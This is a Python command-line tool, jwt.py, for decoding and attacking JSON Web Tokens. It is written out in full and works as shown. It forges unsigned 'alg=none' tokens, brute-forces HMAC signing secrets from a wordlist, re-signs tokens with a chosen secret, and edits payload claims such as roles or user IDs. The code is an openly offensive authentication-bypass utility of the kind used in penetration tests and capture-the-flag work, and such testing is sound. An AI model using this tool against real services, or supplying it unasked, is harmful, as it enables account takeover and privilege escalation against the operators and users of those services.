#!/usr/bin/env python3
"""
jwt.py — decode / inspect / forge JWTs.

Usage:
  jwt.py decode <token>
  jwt.py none   <token>                 # forge alg=none variant
  jwt.py sign   <token> <secret> [alg]  # resign with new HMAC secret (default HS256)
  jwt.py crack  <token> <wordlist>      # brute HMAC secret
  jwt.py edit   <token> <json_patch>    # patch payload (JSON object merged in)
"""
import base64, hashlib, hmac, json, sys


def b64u_dec(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def b64u_enc(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def split(tok: str):
    parts = tok.split(".")
    if len(parts) != 3:
        sys.exit("not a 3-part JWT")
    return parts


def decode(tok: str):
    h, p, s = split(tok)
    hd = json.loads(b64u_dec(h))
    pd = json.loads(b64u_dec(p))
    print("header :", json.dumps(hd, indent=2))
    print("payload:", json.dumps(pd, indent=2))
    print("sig    :", s or "(empty)")


def forge_none(tok: str):
    _, p, _ = split(tok)
    h = b64u_enc(b'{"alg":"none","typ":"JWT"}')
    print(f"{h}.{p}.")


def _sign(h_b64: str, p_b64: str, secret: str, alg: str) -> str:
    algmap = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    if alg not in algmap:
        sys.exit(f"alg not supported: {alg}")
    msg = f"{h_b64}.{p_b64}".encode()
    sig = hmac.new(secret.encode(), msg, algmap[alg]).digest()
    return b64u_enc(sig)


def resign(tok: str, secret: str, alg: str = "HS256"):
    h, p, _ = split(tok)
    hd = json.loads(b64u_dec(h))
    hd["alg"] = alg
    h_new = b64u_enc(json.dumps(hd, separators=(",", ":")).encode())
    sig = _sign(h_new, p, secret, alg)
    print(f"{h_new}.{p}.{sig}")


def crack(tok: str, wordlist: str):
    h, p, s = split(tok)
    hd = json.loads(b64u_dec(h))
    alg = hd.get("alg", "HS256")
    with open(wordlist, "rb", buffering=1 << 20) as f:
        for raw in f:
            pw = raw.rstrip(b"\r\n").decode(errors="ignore")
            if _sign(h, p, pw, alg) == s:
                print(f"FOUND: {pw}")
                return
    print("not in wordlist")


def edit(tok: str, patch_json: str):
    h, p, s = split(tok)
    pd = json.loads(b64u_dec(p))
    pd.update(json.loads(patch_json))
    p_new = b64u_enc(json.dumps(pd, separators=(",", ":")).encode())
    print(f"{h}.{p_new}.{s}  (unsigned — re-sign if needed)")


def main():
    if len(sys.argv) < 2:
        print(__doc__); sys.exit(1)
    cmd, *rest = sys.argv[1:]
    try:
        {
            "decode": lambda: decode(rest[0]),
            "none":   lambda: forge_none(rest[0]),
            "sign":   lambda: resign(rest[0], rest[1], rest[2] if len(rest) > 2 else "HS256"),
            "crack":  lambda: crack(rest[0], rest[1]),
            "edit":   lambda: edit(rest[0], rest[1]),
        }[cmd]()
    except KeyError:
        print(__doc__); sys.exit(1)
    except IndexError:
        sys.exit("missing args — see --help")


if __name__ == "__main__":
    main()
